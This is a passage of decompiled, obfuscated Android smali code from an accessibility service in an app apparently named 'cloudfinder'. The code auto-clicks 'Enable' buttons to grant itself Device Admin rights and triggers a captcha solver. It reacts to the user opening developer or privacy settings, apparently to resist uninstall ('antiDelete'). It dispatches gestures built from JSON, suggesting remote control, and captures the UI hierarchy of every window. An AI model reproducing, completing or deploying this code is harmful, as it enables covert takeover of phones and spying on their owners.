    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_29

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_29

    const-string v3, "com.android.settings:id/verification_view"

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_24

    invoke-interface {v3}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_24

    sget-boolean v3, Lڗًقڔ/ء;->أ:Z

    if-nez v3, :cond_24

    const-string v3, "Captcha dialog detected, triggering CaptchaSolver"

    invoke-static {v5, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static/range {p0 .. p0}, Lڗًقڔ/ء;->ؾ(Landroid/accessibilityservice/AccessibilityService;)V

    :cond_24
    sget-boolean v3, Lسۄھؤۏ۫/؋;->ز:Z

    if-eqz v3, :cond_29

    const/16 v3, 0xf

    new-array v4, v3, [Ljava/lang/String;
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_10

    const/4 v8, 0x0

    :try_start_15
    aput-object v16, v4, v8

    aput-object v15, v4, v19

    aput-object v17, v4, v29
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_f

    const/4 v3, 0x3

    :try_start_16
    aput-object v14, v4, v3

    aput-object v13, v4, v30

    aput-object v12, v4, v31

    aput-object v11, v4, v27

    aput-object v10, v4, v28

    const/16 v6, 0x8

    aput-object v9, v4, v6

    const/16 v6, 0x9

    aput-object v26, v4, v6

    const/16 v6, 0xa

    aput-object v24, v4, v6

    const/16 v6, 0xb

    aput-object v20, v4, v6

    const/16 v6, 0xc

    aput-object v18, v4, v6

    const-string v6, "Enable"

    const/16 v7, 0xd

    aput-object v6, v4, v7

    const-string v6, "\u542f\u7528"

    const/16 v7, 0xe

    aput-object v6, v4, v7

    move v6, v8

    const/16 v7, 0xf

    :goto_18
    if-ge v6, v7, :cond_2a

    aget-object v9, v4, v6

    invoke-virtual {v0, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v10

    if-nez v10, :cond_26

    :cond_25
    const/16 v12, 0x10

    goto :goto_1b

    :cond_26
    invoke-interface {v10}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v10

    :goto_19
    invoke-interface {v10}, Ljava/util/Iterator;->hasNext()Z

    move-result v11

    if-eqz v11, :cond_25

    invoke-interface {v10}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v12

    if-eqz v12, :cond_27

    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v12

    invoke-interface {v12}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v12

    goto :goto_1a

    :cond_27
    move-object/from16 v12, v25

    :goto_1a
    const-string v13, "Button"

    invoke-virtual {v12, v13}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_28

    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v12

    if-eqz v12, :cond_28

    const/16 v12, 0x10

    invoke-virtual {v11, v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "Device Admin confirm auto-click: "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v5, v10}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v10, "device_admin"

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "CONFIRM_CLICKED|"

    invoke-virtual {v11, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v10, v9}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_11

    goto :goto_1b

    :cond_28
    const/16 v12, 0x10

    goto :goto_19

    :goto_1b
    add-int/lit8 v6, v6, 0x1

    goto :goto_18

    :catch_f
    const/4 v3, 0x3

    goto :goto_1c

    :catch_10
    :cond_29
    const/4 v3, 0x3

    const/4 v8, 0x0

    :catch_11
    :cond_2a
    :goto_1c
    move-object/from16 v4, p4

    if-eqz v4, :cond_35

    invoke-virtual/range {p4 .. p4}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_35

    const-string v0, "android.widget.FrameLayout"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2b

    move/from16 v19, v8

    goto :goto_1d

    :cond_2b
    const-string v0, "android.widget.LinearLayout"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2c

    goto :goto_1d

    :cond_2c
    const-string v0, "android.widget.ViewFlipper"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2d

    move/from16 v19, v29

    goto :goto_1d

    :cond_2d
    const-string v0, "android.widget.ImageView"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2e

    move/from16 v19, v3

    goto :goto_1d

    :cond_2e
    const-string v0, "android.view.View"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2f

    move/from16 v19, v30

    goto :goto_1d

    :cond_2f
    const-string v0, "android.view.ViewGroup"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_30

    move/from16 v19, v31

    goto :goto_1d

    :cond_30
    const-string v0, "android.widget.ScrollView"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_31

    move/from16 v19, v27

    goto :goto_1d

    :cond_31
    const-string v0, "android.widget.RelativeLayout"

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_32

    move/from16 v19, v28

    goto :goto_1d

    :cond_32
    const/16 v19, -0x1

    :goto_1d
    if-ltz v19, :cond_34

    if-nez v19, :cond_33

    sget-object v0, Lسۄھؤۏ۫/؋;->ة:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    :cond_33
    const-string v0, "com.coloros.phonemanager"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_35

    :try_start_17
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_13

    :try_start_18
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v22
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_12

    :catch_12
    move-object/from16 v2, v22

    :try_start_19
    invoke-static {v0, v2}, Lڃٷښـ۝ۼ/ؠ;->ث(Landroid/content/Context;Landroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_13

    goto :goto_1e

    :cond_34
    const-string v0, "androidx.widget"

    invoke-virtual {v4, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_35

    const-string v0, "android.view"

    invoke-virtual {v4, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_35

    const-string v0, "androidx.view"

    invoke-virtual {v4, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_35

    sput-object v4, Lسۄھؤۏ۫/؋;->ت:Ljava/lang/String;

    sput-object v2, Lسۄھؤۏ۫/؋;->ة:Ljava/lang/String;

    if-eqz p2, :cond_35

    :try_start_1a
    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getWindow()Landroid/view/accessibility/AccessibilityWindowInfo;

    move-result-object v0

    if-eqz v0, :cond_35

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityWindowInfo;->getType()I
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_13

    :catch_13
    :cond_35
    :goto_1e
    :try_start_1b
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v6
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_14

    goto :goto_1f

    :catch_14
    move v6, v8

    :goto_1f
    :try_start_1c
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-static {v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->و(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const/16 v2, 0x20

    if-ne v6, v2, :cond_36

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_36

    invoke-virtual {v1, v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ة(Ljava/lang/String;)V
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_15

    :catch_15
    :cond_36
    sget-boolean v0, Lسۄھؤۏ۫/؋;->ئ:Z

    if-eqz v0, :cond_37

    sget-boolean v0, Lسۄھؤۏ۫/؋;->ج:Z

    if-nez v0, :cond_37

    sget-boolean v0, Lڝږ؁ڋ/و;->؋:Z

    if-nez v0, :cond_37

    invoke-virtual/range {p0 .. p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٯ()V

    :cond_37
    :try_start_1d
    invoke-virtual/range {p0 .. p1}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؤ(Landroid/view/accessibility/AccessibilityEvent;)Z
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_16

    :catch_16
    :try_start_1e
    invoke-virtual {v1, v4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ع(Ljava/lang/String;)V
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_17

    :catch_17
    sget-boolean v0, Lسۄھؤۏ۫/؋;->د:Z

    if-eqz v0, :cond_38

    :try_start_1f
    invoke-static/range {p0 .. p1}, Lڝږ؁ڋ/ئ;->أ(Landroid/accessibilityservice/AccessibilityService;Landroid/view/accessibility/AccessibilityEvent;)V
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_18

    :catch_18
    :cond_38
    :try_start_20
    sget-boolean v0, Lسۄھؤۏ۫/؋;->ب:Z

    if-eqz v0, :cond_39

    goto :goto_20

    :cond_39
    if-nez p2, :cond_3a

    goto :goto_20

    :cond_3a
    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_19

    :catch_19
    :goto_20
    :try_start_21
    invoke-virtual/range {p0 .. p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ظ()V
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_1a

    :catch_1a
    :try_start_22
    sget-object v0, Lسۄھؤۏ۫/؋;->ة:Ljava/lang/String;

    if-nez v0, :cond_3b

    goto :goto_21

    :cond_3b
    const-string v2, "DevelopmentSettingsActivity"

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_3c

    const-string v2, "PrivacySettingsActivity"

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_3d

    :cond_3c
    invoke-virtual/range {p0 .. p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٵ()V

    invoke-virtual/range {p0 .. p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٯ()V
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_1b

    :catch_1b
    :cond_3d
    :goto_21
    return-void
.end method

.method public final ؿ(Ljava/lang/String;)V
    .locals 3

    :try_start_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lڛڜڕڰڑ/؋;

    const/4 v2, 0x4

    invoke-direct {v1, p0, p1, v2}, Lڛڜڕڰڑ/؋;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;Ljava/lang/String;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public final ـ()Z
    .locals 3

    sget-boolean v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز:Z

    const/4 v1, 0x0

    if-nez v0, :cond_0

    return v1

    :cond_0
    const-string v0, "config"

    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v1, "antiDelete"

    const/4 v2, 0x1

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    return v0
.end method

.method public final ق(Ljava/lang/String;)Z
    .locals 3

    const/4 v0, 0x0

    if-eqz p1, :cond_2

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_0

    goto :goto_0

    :cond_0
    :try_start_0
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.MAIN"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v2, "android.intent.category.HOME"

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {v2, v1, v0}, Landroid/content/pm/PackageManager;->queryIntentActivities(Landroid/content/Intent;I)Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_1
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_2

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/content/pm/ResolveInfo;

    iget-object v2, v2, Landroid/content/pm/ResolveInfo;->activityInfo:Landroid/content/pm/ActivityInfo;

    if-eqz v2, :cond_1

    iget-object v2, v2, Landroid/content/pm/ActivityInfo;->packageName:Ljava/lang/String;

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v2, :cond_1

    const/4 p1, 0x1

    return p1

    :catch_0
    :cond_2
    :goto_0
    return v0
.end method

.method public final ل(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 4

    const/4 v0, 0x0

    if-nez p1, :cond_0

    return v0

    :cond_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    const/4 v2, 0x1

    if-eqz v1, :cond_1

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_1

    return v2

    :cond_1
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v1

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    invoke-virtual {v1, v3}, Landroid/content/pm/PackageItemInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object p1

    if-eqz p1, :cond_2

    invoke-interface {p1}, Ljava/util/List;->isEmpty()Z

    move-result p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-nez p1, :cond_2

    return v2

    :catch_0
    :cond_2
    return v0
.end method

.method public final ه(Lorg/json/JSONArray;)V
    .locals 12

    :try_start_0
    new-instance v0, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    invoke-virtual {p1}, Lorg/json/JSONArray;->length()I

    move-result v3

    const/4 v4, 0x1

    if-ge v2, v3, :cond_1

    invoke-virtual {p1, v2}, Lorg/json/JSONArray;->optJSONArray(I)Lorg/json/JSONArray;

    move-result-object v3

    invoke-static {v3}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ن(Lorg/json/JSONArray;)[Ljava/lang/Object;

    move-result-object v3

    if-eqz v3, :cond_0

    array-length v5, v3

    const/4 v6, 0x2

    if-ne v5, v6, :cond_0

    aget-object v5, v3, v1

    move-object v7, v5

    check-cast v7, Landroid/graphics/Path;

    aget-object v3, v3, v4

    check-cast v3, Ljava/lang/Integer;

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    new-instance v4, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v8, 0x0

    int-to-long v10, v3

    move-object v6, v4

    invoke-direct/range {v6 .. v11}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    invoke-virtual {v0, v4}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    invoke-virtual {v0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p1

    new-instance v0, Lڛڜڕڰڑ/ؤ;

    invoke-direct {v0, v4, p0}, Lڛڜڕڰڑ/ؤ;-><init>(ILjava/lang/Object;)V

    const/4 v1, 0x0

    invoke-virtual {p0, p1, v0, v1}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    return-void
.end method

.method public final ٯ()V
    .locals 6

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sget-wide v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ح:J

    sub-long v2, v0, v2

    const-wide/16 v4, 0xc8

    cmp-long v2, v2, v4

    if-gez v2, :cond_0

    return-void

    :cond_0
    sput-wide v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ح:J

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ج:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lڛڜڕڰڑ/ء;

    const/4 v2, 0x4

    invoke-direct {v1, p0, v2}, Lڛڜڕڰڑ/ء;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    return-void
.end method

.method public final ٲ(II)V
    .locals 6

    :try_start_0
    new-instance v1, Landroid/graphics/Path;

    invoke-direct {v1}, Landroid/graphics/Path;-><init>()V

    int-to-float p1, p1

    int-to-float p2, p2

    invoke-virtual {v1, p1, p2}, Landroid/graphics/Path;->moveTo(FF)V

    new-instance p1, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {p1}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    new-instance p2, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v2, 0x0

    const-wide/16 v4, 0x32

    move-object v0, p2

    invoke-direct/range {v0 .. v5}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    invoke-virtual {p1, p2}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {p1}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p1

    const/4 p2, 0x0

    invoke-virtual {p0, p1, p2, p2}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    new-instance p2, Ljava/lang/StringBuilder;

    const-string v0, "tapByGesture failed: "

    invoke-direct {p2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "MyAccessSvc"

    invoke-static {p2, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method

.method public final ٴ()V
    .locals 19

    move-object/from16 v7, p0

    const-string v8, "capture"

    const-string v9, "MyAccessSvc"

    const-string v0, "\""

    const/4 v10, 0x0

    iput v10, v7, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ئ:I

    :try_start_0
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v1

    iget v11, v1, Landroid/util/DisplayMetrics;->widthPixels:I

    iget v12, v1, Landroid/util/DisplayMetrics;->heightPixels:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_6

    :try_start_1
    const-string v1, "window"

    invoke-virtual {v7, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    invoke-interface {v1}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/Display;->getRotation()I

    move-result v1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move v1, v10

    :goto_0
    :try_start_2
    sget-object v2, Lسۄھؤۏ۫/؋;->ة:Ljava/lang/String;

    sget-object v13, Lسۄھؤۏ۫/؋;->ت:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_6

    if-nez v2, :cond_0

    const-string v2, ""

    :cond_0
    move-object v14, v2

    :try_start_3
    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "<hierarchy rotation=\""

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, " width=\""

    invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, " height=\""

    invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v12}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, " pkg=\""

    invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v14}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, " activity=\""

    invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v13}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ">"

    invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-instance v6, Landroid/graphics/Rect;

    invoke-direct {v6, v10, v10, v11, v12}, Landroid/graphics/Rect;-><init>(IIII)V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getWindows()Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_2

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v16

    :goto_1
    invoke-interface/range {v16 .. v16}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-interface/range {v16 .. v16}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityWindowInfo;

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityWindowInfo;->getType()I

    move-result v2

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityWindowInfo;->getRoot()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v17

    if-nez v17, :cond_1

    invoke-virtual {v7, v1, v15, v6}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->آ(Landroid/view/accessibility/AccessibilityWindowInfo;Ljava/lang/StringBuilder;Landroid/graphics/Rect;)V
    :try_end_3
